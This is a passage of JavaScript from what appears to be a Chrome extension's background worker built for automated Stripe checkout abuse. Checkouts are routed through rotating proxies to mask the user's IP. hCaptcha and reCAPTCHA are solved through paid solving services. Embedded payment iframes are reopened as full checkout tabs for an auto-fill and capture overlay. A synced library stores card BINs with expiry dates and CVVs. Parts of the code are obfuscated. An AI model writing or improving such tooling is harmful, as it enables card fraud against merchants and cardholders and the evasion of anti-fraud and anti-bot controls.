// because the checkout then runs unmasked. Rotating to a working proxy (which
// clears _failoverBypass) restores proxy-IP checkout.
const _PROXY_TUNNEL_ERRORS = new Set([
  "net::ERR_TUNNEL_CONNECTION_FAILED",
  "net::ERR_PROXY_CONNECTION_FAILED",
  "net::ERR_PROXY_AUTH_UNSUPPORTED",
  "net::ERR_NO_SUPPORTED_PROXIES",
  "net::ERR_PROXY_CERTIFICATE_INVALID",
  "net::ERR_SOCKS_CONNECTION_FAILED",
  "net::ERR_SOCKS_CONNECTION_HOST_UNREACHABLE",
]);
// Host suffixes we treat as checkout targets worth failing open on.
const _CHECKOUT_SUFFIXES = ["stripe.com", "stripe.network"];
const _failoverHandledTabs = new Map(); // tabId -> host, avoids reload loops
// Tracks tabs that recently received an overlay injection to prevent duplicate
// injections when both STRIPE_CHECKOUT_DETECTED and _semexWatchEmbeddedStripe
// fire for the same page within milliseconds of each other.
const _semexInjectedTabs = new Map(); // tabId -> timestamp
function _isCheckoutHost(_host) {
  if (!_host) return false;
  const _h = String(_host).toLowerCase();
  return _CHECKOUT_SUFFIXES.some(s => _h === s || _h.endsWith("." + s));
}
if (chrome.webRequest && chrome.webRequest.onErrorOccurred) {
  chrome.webRequest.onErrorOccurred.addListener(async (_d) => {
    try {
      if (!_d || _d.tabId < 0) return;
      if (!_PROXY_TUNNEL_ERRORS.has(_d.error)) return;
      if (!currentProxy) return; // no active proxy → not our failover case
      let _host = "";
      try { _host = new URL(_d.url).hostname; } catch (e) { return; }
      if (_d.type === "main_frame") {
        if (!_isCheckoutHost(_host)) return;
        // Avoid reload loops: only fail-open once per (tab, host).
        if (_failoverHandledTabs.get(_d.tabId) === _host) return;
        _failoverHandledTabs.set(_d.tabId, _host);
        // Bypass ALL stripe hosts so sub-resources (js/m/api.stripe.com) also load.
        _failoverBypass.add("stripe.com");
        _failoverBypass.add("*.stripe.com");
        // Re-apply the SAME proxy with the updated bypass list, then reload.
        try { await activateProxy(currentProxy); } catch (e) {}
        try {
          chrome.action.setBadgeBackgroundColor({ color: "#f59e0b" });
          chrome.action.setBadgeText({ text: "IP!" });
          setTimeout(() => { try { chrome.action.setBadgeText({ text: "" }); } catch (e) {} }, 8000);
        } catch (e) {}
        try {
          chrome.tabs.sendMessage(_d.tabId, {
            type: "SEMEX_PROXY_FAILOVER",
            host: _host,
            message: "Proxy couldn't reach checkout — opened on your REAL IP. Rotate to a working proxy for masked checkout.",
          });
        } catch (e) {}
        try { chrome.tabs.reload(_d.tabId); } catch (e) {}
        return;
      }
      // v2.8.8 — SUBMIT-TIME failover: the payment confirm is an XHR/fetch to
      // api.stripe.com, NOT a main_frame navigation — so when the proxy chokes
      // on it (ERR_TUNNEL_CONNECTION_FAILED etc.) the old listener ignored it
      // and Stripe showed "Something went wrong / network not connected — you
      // have not been charged" on every retry. Fail open the payment API only
      // (telemetry hosts stay proxied), re-apply the proxy WITHOUT reloading
      // the tab (a reload would lose the filled checkout), and tell the user
      // to press Pay again.
      if (_d.type === "xmlhttprequest" && _host === "api.stripe.com") {
        if (_failoverBypass.has("api.stripe.com")) return; // already failed open
        _failoverBypass.add("api.stripe.com");
        try { await activateProxy(currentProxy); } catch (e) {}
        try {
          chrome.action.setBadgeBackgroundColor({ color: "#f59e0b" });
          chrome.action.setBadgeText({ text: "IP!" });
          setTimeout(() => { try { chrome.action.setBadgeText({ text: "" }); } catch (e) {} }, 10000);
        } catch (e) {}
        try {
          chrome.tabs.sendMessage(_d.tabId, {
            type: "SEMEX_PROXY_FAILOVER",
            host: _host,
            message: "Proxy couldn't reach Stripe's payment API — Stripe now connects DIRECTLY (real IP). Press Subscribe/Pay again.",
          });
        } catch (e) {}
      }
    } catch (e) {}
  }, { urls: ["<all_urls>"], types: ["main_frame", "xmlhttprequest"] });
}
// Clear the per-tab failover memory when a tab navigates away or closes.
// NAVIGATION: fill trust is document-scoped. Without this, a tab that filled a
// card and then navigated to an unrelated page kept its "genuine fill" stamp
// for 3 minutes — any gateway-like JSON on the NEW page passed the false-hit
// guard. Clear all document-scoped maps on every top-level navigation commit.
if (chrome.webNavigation && chrome.webNavigation.onCommitted) {
  chrome.webNavigation.onCommitted.addListener(_0xd => {
    if (!_0xd || _0xd.frameId !== 0 || !_0xd.tabId) return;
    try { _failoverHandledTabs.delete(_0xd.tabId); } catch (e) {}
    try { _semexLastFillByTab.delete(_0xd.tabId); } catch (e) {}
    try { _lastFillBroadcast.delete(_0xd.tabId); } catch (e) {}
    try { _semexCardByTab.delete(_0xd.tabId); } catch (e) {}
    try { _semexConfirmStartByTab.delete(_0xd.tabId); } catch (e) {}
  });
}
if (chrome.tabs && chrome.tabs.onRemoved) {
  chrome.tabs.onRemoved.addListener(_tabId => {
    // BUGFIX: all per-tab maps must be pruned — previously only
    // _failoverHandledTabs was cleared, leaking fill-tracking entries forever.
    try { _failoverHandledTabs.delete(_tabId); } catch (e) {}
    try { _semexLastFillByTab.delete(_tabId); } catch (e) {}
    try { _lastFillBroadcast.delete(_tabId); } catch (e) {}
    try { _semexCardByTab.delete(_tabId); } catch (e) {}
    try { _semexConfirmStartByTab.delete(_tabId); } catch (e) {}
  });
}

// ─── 2Captcha hCaptcha token solver ───────────────────────────────────────────
// Runs in the service worker so the API key never touches the page DOM and the
// HTTP calls use the extension's host permissions (no page-CORS restrictions).
// Uses the classic 2Captcha in.php/res.php flow with json=1.
const TWOCAPTCHA_BASE = "https://2captcha.com";
const TWOCAPTCHA_POLL_INTERVAL = 5000;   // 2Captcha recommends polling every ~5s
const TWOCAPTCHA_MAX_ATTEMPTS = 24;      // ~120s total before giving up
function _sleepBg(ms) { return new Promise(r => setTimeout(r, ms)); }
async function get2CaptchaApiKey() {
  try {
    const s = await chrome.storage.local.get("settings");
    return ((s && s.settings && s.settings.captchaSolving && s.settings.captchaSolving.api_key) || "").trim();
  } catch (_e) { return ""; }
}
async function solveHCaptchaWith2Captcha(_req) {
  const sitekey = _req && _req.sitekey;
  const pageurl = (_req && _req.pageurl) || "";
  if (!sitekey) return { success: false, error: "Missing hCaptcha sitekey" };
  const apiKey = await get2CaptchaApiKey();
  if (!apiKey) return { success: false, error: "No 2Captcha API key set (Captcha settings)" };
  // 1) Submit the task.
  let captchaId = null;
  try {
    const inParams = new URLSearchParams({
      key: apiKey,
      method: "hcaptcha",
      sitekey: sitekey,
      pageurl: pageurl,
      json: "1",
    });
    if (_req && _req.invisible) inParams.set("invisible", "1");
    const inResp = await fetch(TWOCAPTCHA_BASE + "/in.php", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: inParams.toString(),
    });
    const inData = await inResp.json();
    if (String(inData.status) !== "1") {
      return { success: false, error: "2Captcha submit failed: " + (inData.request || "unknown") };
    }
    captchaId = inData.request;
  } catch (e) {
    return { success: false, error: "2Captcha submit error: " + (e && e.message || e) };
  }
  // 2) Poll for the token.
  for (let i = 0; i < TWOCAPTCHA_MAX_ATTEMPTS; i++) {
    await _sleepBg(TWOCAPTCHA_POLL_INTERVAL);
    try {
      const resResp = await fetch(TWOCAPTCHA_BASE + "/res.php?" + new URLSearchParams({
        key: apiKey, action: "get", id: captchaId, json: "1",
      }).toString());
      const resData = await resResp.json();
      if (String(resData.status) === "1") {
        return { success: true, token: resData.request };
      }
      if (resData.request && resData.request !== "CAPCHA_NOT_READY") {
        return { success: false, error: "2Captcha error: " + resData.request };
      }
    } catch (_e) { /* transient — keep polling */ }
  }
  return { success: false, error: "2Captcha timed out waiting for token" };
}
__name(solveHCaptchaWith2Captcha, "solveHCaptchaWith2Captcha");

// ─── NopeCHA hCaptcha token solver (v2.8.9) ─────────────────────────────────
// NopeCHA token API: POST / {key, type:"hcaptcha", sitekey, url} → {data: jobId},
// then poll GET /?key&id=jobId → {data: token} (error 14 = still processing).
// Shares the same settings.captchaSolving.api_key field as 2Captcha — the
// provider dropdown (captchaSolving.provider) decides which API the key is for.
const NOPECHA_ERR = { 1: "Invalid API key", 2: "No credit remaining", 3: "Invalid request", 4: "Rate limited", 10: "Invalid request data", 14: "Still processing", 15: "Quota exceeded" };
async function solveHCaptchaWithNopeCHA(_req) {
  const sitekey = _req && _req.sitekey;
  const pageurl = (_req && _req.pageurl) || "";
  if (!sitekey) return { success: false, error: "Missing hCaptcha sitekey" };
  const apiKey = await get2CaptchaApiKey();
  if (!apiKey) return { success: false, error: "No NopeCHA API key set (Captcha settings)" };
  let jobId = null;
  try {
    const r = await fetch(NOPECHA_API_BASE + "/", {
      method: "POST",
      headers: { accept: "application/json", "content-type": "application/json" },
      body: JSON.stringify({ key: apiKey, type: "hcaptcha", sitekey: sitekey, url: pageurl, enterprise: true }),
    });
    const t = await r.text();
    let j = null;
    try { j = JSON.parse(t); } catch (_e) {}
    if (!j) return { success: false, error: "NopeCHA bad response (HTTP " + r.status + ")" };
    if (!r.ok || j.error !== undefined) {
      if (j && j.error !== undefined) return { success: false, error: "NopeCHA: " + (NOPECHA_ERR[j.error] || j.message || ("Error " + j.error)) };
      return { success: false, error: "NopeCHA HTTP " + r.status };
    }
    jobId = j.data;
    if (!jobId) return { success: false, error: "NopeCHA returned no job id" };
  } catch (e) {
    return { success: false, error: "NopeCHA submit error: " + (e && e.message || e) };
  }
  for (let i = 0; i < CAPTCHA_POLL_MAX_ATTEMPTS; i++) {
    await _sleepBg(CAPTCHA_POLL_INTERVAL);
    try {
      const rr = await fetch(NOPECHA_API_BASE + "/?" + new URLSearchParams({ key: apiKey, id: String(jobId) }).toString());
      const jj = await rr.json();
      if (jj && jj.data) return { success: true, token: jj.data };
      if (jj && jj.error !== undefined && Number(jj.error) !== 14) {
        return { success: false, error: "NopeCHA: " + (NOPECHA_ERR[jj.error] || jj.message || ("Error " + jj.error)) };
      }
      // error 14 = still processing → keep polling
    } catch (_e) { /* transient — keep polling */ }
  }
  return { success: false, error: "NopeCHA timed out waiting for token" };
}
__name(solveHCaptchaWithNopeCHA, "solveHCaptchaWithNopeCHA");

async function getCaptchaProvider() {
  try {
    const s = await chrome.storage.local.get("settings");
    const p = s && s.settings && s.settings.captchaSolving && s.settings.captchaSolving.provider;
    return p === "nopecha" ? "nopecha" : "2captcha";
  } catch (_e) { return "2captcha"; }
}
chrome.runtime.onMessage.addListener((_msg, _sender, _sendResponse) => {
  if (_msg && _msg.type === "SOLVE_HCAPTCHA_2CAPTCHA") {
    // v2.8.9 — route by the selected provider. Message type name kept for
    // backward compatibility with content/captcha-solver.js.
    getCaptchaProvider()
      .then(p => (p === "nopecha" ? solveHCaptchaWithNopeCHA(_msg) : solveHCaptchaWith2Captcha(_msg)))
      .then(_sendResponse)
      .catch(e => _sendResponse({ success: false, error: (e && e.message) || String(e) }));
    return true; // async
  }
});

const NOPECHA_API_BASE = "https://api.nopecha.com";
const CAPTCHA_MAX_RETRIES = 3;
const CAPTCHA_RETRY_DELAY = 2000;
const CAPTCHA_POLL_INTERVAL = 2000;
const CAPTCHA_POLL_MAX_ATTEMPTS = 60;
async function solveRecaptchaWithNopeCHA(_0x1bd037) {
  var _0x490202;
  var _0x4a8cb0;
  const {
    task: _0x4fa3d5,
    imageData: _0x3839f0,
    grid: _0x56ae89,
    pageUrl: _0x5caf9c
  } = _0x1bd037;
  const _0x7f738d = await chrome.storage.local.get("settings");
  const _0x3b9930 = ((_0x4a8cb0 = (_0x490202 = _0x7f738d == null ? undefined : _0x7f738d.settings) == null ? undefined : _0x490202.captchaSolving) == null ? undefined : _0x4a8cb0.api_key) || "";
  if (!_0x3b9930) {
    return {
      success: false,
      error: "No NopeCHA API key configured. Please add your API key in Captcha settings."
    };
  }
  const _0x244359 = {
    key: _0x3b9930,
    type: "recaptcha",
    task: _0x4fa3d5
  };
  if (_0x3839f0 && _0x3839f0.length > 0) {
    _0x244359.image_data = _0x3839f0.map(_0x346061 => {
      if (_0x346061 && _0x346061.startsWith("data:")) {
        return _0x346061.replace(/^data:image\/[a-z]+;base64,/, "");
      }
      return _0x346061;
    });
  } else {
    return {
      success: false,
      error: "No image data provided"
    };
  }
  if (_0x56ae89) {
    _0x244359.grid = _0x56ae89;
  }
  try {
    const _0x27d2a1 = await fetch(NOPECHA_API_BASE, {
      method: "POST",
      headers: {
        accept: "application/json",
        "content-type": "application/json"
      },
      body: JSON.stringify(_0x244359)
    });
    const _0x19ee66 = await _0x27d2a1.text();
    if (_0x27d2a1.status >= 500) {
      return {
        success: false,
        error: "Server error: " + _0x27d2a1.status
      };
    }
    if (!_0x27d2a1.ok) {
      try {
        const _0x241631 = JSON.parse(_0x19ee66);
        if (_0x241631.error !== undefined) {
          const _0x4dad81 = {
            1: "Invalid API key",
            2: "No credit remaining",
            3: "Invalid request",
            4: "Rate limited",
            10: "Invalid image data",
            14: "Still processing",
            15: "Quota exceeded"
          };
          const _0x595825 = _0x4dad81[_0x241631.error] || _0x241631.message || "Error code: " + _0x241631.error;
          return {
            success: false,
            error: _0x595825
          };
        }
      } catch (_0x11a6f2) {}
      return {
        success: false,
        error: "API error: " + _0x27d2a1.status
      };
    }
    let _0x1369a6;
    try {
      _0x1369a6 = JSON.parse(_0x19ee66);
    } catch (_0x122e8e) {
      return {
        success: false,
        error: "Invalid JSON response from API"
      };
    }
    if (_0x1369a6.error) {
      const _0x432a1b = {
        1: "Invalid API key",
        2: "No credit remaining",
        14: "Still processing",
        15: "Quota exceeded"
      };
      const _0x1737b1 = _0x432a1b[_0x1369a6.error] || _0x1369a6.message || "Error code: " + _0x1369a6.error;
      return {
        success: false,
        error: _0x1737b1
      };
    }
    if (Array.isArray(_0x1369a6.data)) {
      return {
        success: true,
        result: {
          tileSelections: _0x1369a6.data
        }
      };
    }
    if (_0x1369a6.data && typeof _0x1369a6.data === "string") {
      return await pollNopechaResult(_0x1369a6.data, _0x3b9930);
    }
    return {
      success: false,
      error: "Unknown API response"
    };
  } catch (_0x3b6135) {
    return {
      success: false,
      error: _0x3b6135.message
    };
  }
}
__name(solveRecaptchaWithNopeCHA, "solveRecaptchaWithNopeCHA");
async function pollNopechaResult(_0x51205b, _0x5980c4) {
  for (let _0x598d1c = 0; _0x598d1c < CAPTCHA_POLL_MAX_ATTEMPTS; _0x598d1c++) {
    await new Promise(_0x33f6d3 => setTimeout(_0x33f6d3, CAPTCHA_POLL_INTERVAL));
    try {
      const _0x817962 = NOPECHA_API_BASE + "?id=" + _0x51205b + "&key=" + encodeURIComponent(_0x5980c4);
      const _0x38a29c = await fetch(_0x817962, {
        headers: {
          accept: "application/json"
        }
      });
      if (_0x38a29c.status >= 500) {
        continue;
      }
      if (!_0x38a29c.ok) {
        continue;
      }
      const _0x2ca6dc = await _0x38a29c.json();
      if (_0x2ca6dc.error) {
        if (_0x2ca6dc.error === 14) {
          if (_0x598d1c % 10 === 0) {}
          continue;
        }
        return {
          success: false,
          error: _0x2ca6dc.message || "Error code: " + _0x2ca6dc.error
        };
      }
      if (_0x2ca6dc.data) {
        if (Array.isArray(_0x2ca6dc.data)) {
          return {
            success: true,
            result: {
              tileSelections: _0x2ca6dc.data
            }
          };
        } else if (typeof _0x2ca6dc.data === "string") {
          return {
            success: true,
            result: {
              token: _0x2ca6dc.data
            }
          };
        }
      }
    } catch (_0x4209a2) {}
  }
  return {
    success: false,
    error: "Polling timeout - no result after 60 attempts"
  };
}
__name(pollNopechaResult, "pollNopechaResult");
async function getNopechaStatus() {
  var _0x4fedc1;
  var _0xd54355;
  const _0x2d6377 = await chrome.storage.local.get("settings");
  const _0x547660 = ((_0xd54355 = (_0x4fedc1 = _0x2d6377 == null ? undefined : _0x2d6377.settings) == null ? undefined : _0x4fedc1.captchaSolving) == null ? undefined : _0xd54355.api_key) || "";
  if (!_0x547660) {
    return {
      success: false,
      error: "No API key configured",
      credit: 0
    };
  }
  try {
    const _0x5f20e2 = new URL(NOPECHA_API_BASE + "/status");
    _0x5f20e2.searchParams.set("key", _0x547660);
    const _0x35f2b8 = await fetch(_0x5f20e2.toString());
    const _0x44fb07 = await _0x35f2b8.json();
    if (_0x44fb07.error) {
      const _0x5a35c8 = {
        1: "Invalid API key",
        2: "No credit remaining",
        15: "Quota exceeded"
      };
      return {
        success: false,
        error: _0x5a35c8[_0x44fb07.error] || "Error code: " + _0x44fb07.error,
        credit: 0
      };
    }
    return {
      success: true,
      credit: _0x44fb07.credit || 0,
      plan: _0x44fb07.plan || "Unknown"
    };
  } catch (_0x335e1f) {
    return {
      success: false,
      error: _0x335e1f.message
    };
  }
}
__name(getNopechaStatus, "getNopechaStatus");

/* Open a checkout.stripe.com tab when stripe.redirectToCheckout() is intercepted on a merchant page. */
/* v4.0.13 — shared dedupe so the content-script extractor and the network-level
 * watcher below can never double-open the same checkout URL. The durable record
 * lives in chrome.storage.session so it survives MV3 service-worker restarts
 * (in-memory alone reopens the same checkout after a forced worker restart);
 * the Map is just a synchronous fast path, the Set closes the async race. */
const _semexOpenedCheckoutTabs = new Map(); // url -> timestamp (fast path)
const _semexCheckoutTabInflight = new Set();
const _semexDedupeKey = "semex_opened_checkout_tabs_v1";
async function _semexOpenCheckoutTab(_url) {
  try {
    if (!_url) return;
    // v2.8.7 — also allow the shareable Stripe payment-link hosts so the
    // embedded-checkout extractor can reopen them as full checkout pages.
    if (!/^https:\/\/(checkout|buy|donate|pay|invoice|billing)\.stripe\.com\//.test(_url)) return;
    const _now = Date.now();
    for (const [_u, _ts] of _semexOpenedCheckoutTabs) { if (_now - _ts > 60000) _semexOpenedCheckoutTabs.delete(_u); }
    if (_semexOpenedCheckoutTabs.has(_url) || _semexCheckoutTabInflight.has(_url)) return;
    _semexCheckoutTabInflight.add(_url);
    try {
      const _got = await chrome.storage.session.get(_semexDedupeKey);
      const _store = (_got && _got[_semexDedupeKey]) || {};
      for (const _k of Object.keys(_store)) { if (_now - _store[_k] > 60000) delete _store[_k]; }
      if (_store[_url]) return;
      _store[_url] = _now;
      _semexOpenedCheckoutTabs.set(_url, _now);
      await chrome.storage.session.set({ [_semexDedupeKey]: _store });
      chrome.tabs.create({ url: _url });
    } finally { _semexCheckoutTabInflight.delete(_url); }
  } catch (_e) {}
}
chrome.runtime.onMessage.addListener(function(_semexMsg) {
  if (_semexMsg && _semexMsg.type === "SEMEX_OPEN_CHECKOUT_TAB") {
    _semexOpenCheckoutTab(String(_semexMsg.url || ""));
  }
});
/* v4.0.13 — network-level catch-all: a checkout-session iframe embedded by
 * site JS is visible on the wire even when the DOM hides it (late src
 * assignment, shadow roots, non-standard wrappers). Any embedded checkout /
 * payment-link iframe load on a NON-Stripe page reopens as a full checkout
 * tab so the whole pipeline (overlay/fill/capture) applies. */
try {
  chrome.webRequest.onBeforeRequest.addListener(
    function(_d) {
      try {
        if (!_d || _d.type !== "sub_frame") return;
        const _doc = String(_d.documentUrl || _d.initiator || "");
        if (/^https:\/\/(checkout|buy|donate|pay|invoice|billing)\.stripe\.com\//.test(_doc)) return;
        _semexOpenCheckoutTab(String(_d.url || ""));
      } catch (_e) {}
    },
    { urls: [
      "*://checkout.stripe.com/c/pay/cs_*",
      "*://buy.stripe.com/*",
      "*://donate.stripe.com/*"
    ], types: ["sub_frame"] }
  );
} catch (_e) {}

// Normalize one saved-BIN record from the API or local cache — drops malformed
// entries and keeps only safe primitive fields so a poisoned payload can never
// break the overlay renderer or get re-persisted.
function _semexNormalizeBinRec(_0xraw) {
  if (!_0xraw || typeof _0xraw !== "object") return null;
  const _0xbin = String(_0xraw.bin || "").replace(/\D/g, "");
  if (_0xbin.length < 6 || _0xbin.length > 19) return null;
  const _0xstr = (_0xv, _0xmax) => typeof _0xv === "string" && _0xv ? _0xv.slice(0, _0xmax) : null;
  return {
    id: _0xstr(_0xraw.id || _0xraw._id, 40),
    bin: _0xbin,
    label: _0xstr(_0xraw.label, 60),
    notes: _0xstr(_0xraw.notes, 140),
    expiry: _0xstr(_0xraw.expiry, 5),
    cvv: _0xraw.cvv ? String(_0xraw.cvv).replace(/\D/g, "").slice(0, 4) || null : null,
    brand: _0xstr(_0xraw.brand, 24),
    cardType: _0xstr(_0xraw.cardType || _0xraw.card_type, 24),
    level: _0xstr(_0xraw.level, 24),
    bank: _0xstr(_0xraw.bank, 48),
    country: _0xstr(_0xraw.country, 48),
    countryCode: _0xstr(_0xraw.countryCode || _0xraw.country_code, 8)
  };
}
function _semexNormalizeBinList(_0xlist) {
  if (!Array.isArray(_0xlist)) return [];
  return _0xlist.map(_semexNormalizeBinRec).filter(Boolean);
}

/* Device-local BIN adds from the checkout overlay ("use this now", owner
   rule — never uploaded; named database saves stay on SEMEX_SAVE_BIN for the
   dashboard). chrome.runtime messages can only come from our own content
   scripts, so page JS cannot forge this write; the single service-worker
   queue serializes the read-modify-write across every tab and frame. */
let _semexLocalBinQueue = Promise.resolve();
chrome.runtime.onMessage.addListener(function(_semexLBReq, _semexLBSender, _semexLBRespond) {
  if (!_semexLBReq || _semexLBReq.type !== "SEMEX_ADD_LOCAL_BIN") {
    return;
  }
  const _semexLBin = String(_semexLBReq.bin || "").replace(/\D/g, "").slice(0, 8);
  if (_semexLBin.length < 6) {
    _semexLBRespond({ ok: false, error: "invalid_bin" });
    return;
  }
  let _semexLBWriteOk = false;
  _semexLocalBinQueue = _semexLocalBinQueue.then(() => (async () => {
    try {
      const _semexLBRes = await chrome.storage.local.get(["localBins"]);
      const _semexLOld = Array.isArray(_semexLBRes.localBins) ? _semexLBRes.localBins : [];
      const _semexLNext = [{ bin: _semexLBin, addedAt: Date.now() }]
        .concat(_semexLOld.filter(_0xl => String(_0xl && _0xl.bin) !== _semexLBin))
        .slice(0, 50);
      await chrome.storage.local.set({ localBins: _semexLNext });
      _semexLBWriteOk = true;
    } catch (_0xeLBW) {}
  })());
  _semexLocalBinQueue.then(() => { try { _semexLBRespond({ ok: _semexLBWriteOk, error: _semexLBWriteOk ? null : "storage_write_failed" }); } catch (_0xeLR) {} });
  return true;
});

/* Bin library: fetch the signed-in user's saved BINs for the checkout-overlay quick-switcher. */
chrome.runtime.onMessage.addListener(function(_semexBinReq, _semexBinSender, _semexBinRespond) {
  if (!_semexBinReq || _semexBinReq.type !== "SEMEX_GET_SAVED_BINS") {
    return;
  }
  // Merge device-local BINs (added from the checkout overlay, never uploaded)
  // ahead of the account list on EVERY success path — fetch, fresh-cache and
  // error-fallback alike — so the switcher always shows them first.
  const _semexOrigBinRespond = _semexBinRespond;
  let _semexBinMerged = false;
  _semexBinRespond = function(_semexRes) {
    if (_semexBinMerged) return;
    _semexBinMerged = true;
    (async () => {
      try {
        if (_semexRes && _semexRes.ok && Array.isArray(_semexRes.bins)) {
          const _semexLB = (await chrome.storage.local.get(["localBins"])).localBins;
          if (Array.isArray(_semexLB) && _semexLB.length) {
            const _semexSeen = new Set(_semexRes.bins.map(_0xb => String(_0xb && _0xb.bin)));
            const _semexLocals = [];
            for (const _semexLR of _semexLB) {
              const _semexLN = _semexNormalizeBinRec(_semexLR);
              if (_semexLN && !_semexSeen.has(_semexLN.bin)) {
                _semexLN.local = true;
                _semexLocals.push(_semexLN);
                _semexSeen.add(_semexLN.bin);
              }
            }
            if (_semexLocals.length) {
              _semexRes = Object.assign({}, _semexRes, { bins: _semexLocals.concat(_semexRes.bins) });
            }
          }
        }
      } catch (_eMrg) {}
      _semexOrigBinRespond(_semexRes);
    })();
  };
  (async () => {
    try {
      const _semexTok = (await chrome.storage.local.get([_SK_AT]))[_SK_AT];
      if (!_semexTok || typeof serverClient === "undefined" || !serverClient || !serverClient.baseUrl) {
        _semexBinRespond({ ok: false, bins: [], error: "not_authenticated" });
        return;
      }
      // Capture the requesting account's identity BEFORE the fetch — if the
      // account changes mid-flight, the response must not be cached under the
      // NEW account's tag.
      let _semexReqOwner = null;
      try {
      const _semexU0 = _semexAuth0[_SK_UP] || {};
        _semexReqOwner = _semexU0.email || _semexU0.id || _semexU0.telegramId || _semexU0.telegram_id || null;
      } catch (_e0) {}
      // Local-first: the BIN library is mirrored into chrome.storage on every
      // successful save/fetch, so a fresh cache (<5 min) owned by THIS account
      // is served instantly without an API round-trip. Older/missing caches
      // still hit the API and fall back to the cache on transient errors.
      try {
        const _semexCC = await chrome.storage.local.get(["savedBinsCache", "savedBinsOwner", "savedBinsSyncedAt", _SK_UP]);
        const _semexCU = _semexCC[_SK_UP] || {};
        const _semexCMe = _semexCU.email || _semexCU.id || _semexCU.telegramId || _semexCU.telegram_id || null;
        if (_semexReqOwner && _semexCMe === _semexReqOwner && _semexCC.savedBinsOwner === _semexReqOwner &&
            Array.isArray(_semexCC.savedBinsCache) && _semexCC.savedBinsCache.length &&
            Date.now() - (_semexCC.savedBinsSyncedAt || 0) < 5 * 60 * 1000) {
          _semexBinRespond({ ok: true, bins: _semexNormalizeBinList(_semexCC.savedBinsCache), cached: true });
          return;
        }
      } catch (_eCache) {}
      const _semexBinRes = await serverClient.authedFetch("/api/user/bins");
      if (!_semexBinRes.ok) {
        throw new Error("HTTP " + _semexBinRes.status);
      }
      const _semexBinData = await _semexBinRes.json();
      // A 200 with a missing/non-array bins field is malformed, NOT an empty
      // library — throw so the catch path serves the owner-matching cache
      // instead of overwriting it with an empty list.
      if (!Array.isArray(_semexBinData.bins)) throw new Error("Malformed BIN list response");
      // Normalize every record before caching/responding — a malformed API
      // payload must not poison the local cache or crash the overlay renderer.
      const _semexBins = _semexNormalizeBinList(_semexBinData.bins);
      // Fail closed on account-switch mid-flight: never hand one account's BIN
      // list to another account's session, and never cache it under a new tag.
      let _semexNow = null;
      try {
        const _semexU = (await chrome.storage.local.get([_SK_UP]))[_SK_UP] || {};
        _semexNow = _semexU.email || _semexU.id || _semexU.telegramId || _semexU.telegram_id || null;
      } catch (_e) {}
      if (!_semexReqOwner || _semexNow !== _semexReqOwner) {
        _semexBinRespond({ ok: false, bins: [], error: "account_changed" });
        return;
      }
      // Cache locally so the switcher loads instantly next time and survives
      // offline/API-hiccup moments. The cache holds saved CVVs, so it is TAGGED
      // with the owning account — never serve it to a different/logged-out one.
      try {
        await chrome.storage.local.set({ savedBinsCache: _semexBins, savedBinsSyncedAt: Date.now(), savedBinsOwner: _semexReqOwner });
      } catch (_e) {}
      _semexBinRespond({ ok: true, bins: _semexBins });
    } catch (_semexBinErr) {
      // Auth failures (401/expired token) must NOT serve the cache — it could be
      // a previous account's data. Transient failures serve it only when the
      // cache owner matches the currently signed-in account.
      const _semexIsAuthErr = /401/.test(String((_semexBinErr && _semexBinErr.message) || _semexBinErr));
      if (!_semexIsAuthErr) {
        try {
          const _semexC = await chrome.storage.local.get(["savedBinsCache", "savedBinsOwner", _SK_UP, _SK_AT]);
          const _semexU2 = _semexC[_SK_UP] || {};
          const _semexMe = _semexU2.email || _semexU2.id || _semexU2.telegramId || _semexU2.telegram_id || null;
          if (Array.isArray(_semexC.savedBinsCache) && _semexC[_SK_AT] && _semexMe && _semexC.savedBinsOwner === _semexMe) {
            _semexBinRespond({ ok: true, bins: _semexNormalizeBinList(_semexC.savedBinsCache), cached: true });
            return;
          }
        } catch (_e2) {}
      }
      _semexBinRespond({ ok: false, bins: [], error: String((_semexBinErr && _semexBinErr.message) || _semexBinErr) });
    }
  })();
  return true;
});

/* Bin library: save a BIN from the overlay up to the user's account so it
   syncs across devices, and mirror it into the local cache. */
chrome.runtime.onMessage.addListener(function(_semexSaveReq, _semexSaveSender, _semexSaveRespond) {
  if (!_semexSaveReq || _semexSaveReq.type !== "SEMEX_SAVE_BIN") {
    return;
  }
  (async () => {
    try {
      const _semexBinDigits = String(_semexSaveReq.bin || "").replace(/\D/g, "").slice(0, 19);
      if (_semexBinDigits.length < 6) {
        _semexSaveRespond({ ok: false, error: "invalid_bin" });
        return;
      }
      const _semexAuth0 = await chrome.storage.local.get([_SK_AT, _SK_UP]);
      const _semexTok2 = _semexAuth0[_SK_AT];
      if (!_semexTok2 || typeof serverClient === "undefined" || !serverClient || !serverClient.baseUrl) {
        _semexSaveRespond({ ok: false, error: "not_authenticated" });
        return;
      }
      // Capture the initiating account's identity BEFORE the request — an
      // account switch mid-flight must not let this save touch the new
      // account's cache or report success to it.
      const _semexU0 = _semexAuth0[_SK_UP] || {};
      const _semexSaveOwner = _semexU0.email || _semexU0.id || _semexU0.telegramId || _semexU0.telegram_id || null;
      const _semexSaveRes = await serverClient.authedFetch("/api/user/bins", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          bin: _semexBinDigits,
          label: _semexSaveReq.label ? String(_semexSaveReq.label).slice(0, 60) : undefined,
          expiry: _semexSaveReq.expiry ? String(_semexSaveReq.expiry).slice(0, 5) : undefined,
          cvv: _semexSaveReq.cvv ? String(_semexSaveReq.cvv).replace(/\D/g, "").slice(0, 4) : undefined
        })
      });
      // Fail closed on account-switch mid-flight. This guard runs BEFORE any
      // success path — including the "already saved" duplicate shortcut — so a
      // switched account never receives a success response for another
      // account's save.
      let _semexSaveNow = null;
      try {
        const _semexU4 = (await chrome.storage.local.get([_SK_UP]))[_SK_UP] || {};
        _semexSaveNow = _semexU4.email || _semexU4.id || _semexU4.telegramId || _semexU4.telegram_id || null;
      } catch (_e4) {}
      if (!_semexSaveOwner || _semexSaveNow !== _semexSaveOwner) {
        _semexSaveRespond({ ok: false, error: "account_changed" });
        return;
      }
      if (!_semexSaveRes.ok) {
        let _semexErrTxt = "HTTP " + _semexSaveRes.status;
        try { const _semexJ = await _semexSaveRes.json(); if (_semexJ && _semexJ.detail) _semexErrTxt = String(_semexJ.detail); } catch (_e) {}
        // "BIN already saved" → treat as success so the UI doesn't nag.
        if (_semexSaveRes.status === 400 && /already/i.test(_semexErrTxt)) {
          _semexSaveRespond({ ok: true, duplicate: true });
          return;
        }
        _semexSaveRespond({ ok: false, error: _semexErrTxt });
        return;
      }
      // Mirror into the local cache so the next menu open shows it instantly.
